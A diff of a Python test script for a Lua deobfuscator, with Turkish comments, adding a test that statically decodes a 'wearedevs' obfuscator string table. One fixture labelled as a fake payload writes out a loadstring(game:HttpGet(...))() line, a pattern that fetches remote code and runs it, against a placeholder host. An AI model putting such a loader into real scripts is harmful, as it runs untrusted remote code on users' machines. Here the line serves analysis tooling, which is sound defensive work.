@@ -13,7 +13,18 @@ u, nh = deobf.recursive_deobf(t)
 assert "Hello World Test" in u and nh == 16, f"recursive_deobf fail: nh={nh}"
 print("PASS recursive_deobf (hex)")
 
-# 2) drone XSUB yasasi (gercek blob — HAFIZA: drone_blob.txt 311,574 char, decoded 249,256 byte, drone_decoded.bin ile byte-identical)
+# 2) WRD tablo/accessor varyasyonlari: statik, calistirmadan plaintext vermeli
+wrd = '''-- wearedevs.net/obfuscator
+local Q = {"\\072\\101\\108\\108\\111", "World", "\\x46\\105\\114\\101\\083\\101\\114\\118\\101\\114"}
+local K = function(i) return Q[i] end
+print(K(1), Q[2], K(3))
+'''
+opened, meta = deobf.wrd_full_deobf(wrd)
+assert '"Hello"' in opened and '"World"' in opened and '"FireServer"' in opened, opened
+assert meta["replacements"] == 3 and meta["accessors_found"] == 1, meta
+print("PASS wrd static table/accessor")
+
+# 3) drone XSUB yasasi (gercek blob — HAFIZA: drone_blob.txt 311,574 char, decoded 249,256 byte, drone_decoded.bin ile byte-identical)
 blob_path = "/home/user/dumper/drone_blob.txt"
 truth_path = "/home/user/dumper/drone_decoded.bin"
 if os.path.exists(blob_path) and os.path.exists(truth_path):
@@ -32,7 +43,7 @@ if os.path.exists(blob_path) and os.path.exists(truth_path):
 else:
     print("SKIP xsub (drone dosyalari yok)")
 
-# 3) pipeline smokedown — mini fake payload
+# 4) pipeline smokedown — mini fake payload
 fake = 'local LP_123456="..."; loadstring(game:HttpGet("https://x"))()'
 rep, outs = deobf.deobf_pipeline("mini.lua", fake.encode())
 assert "deobf.txt" in outs and "strings.txt" in outs
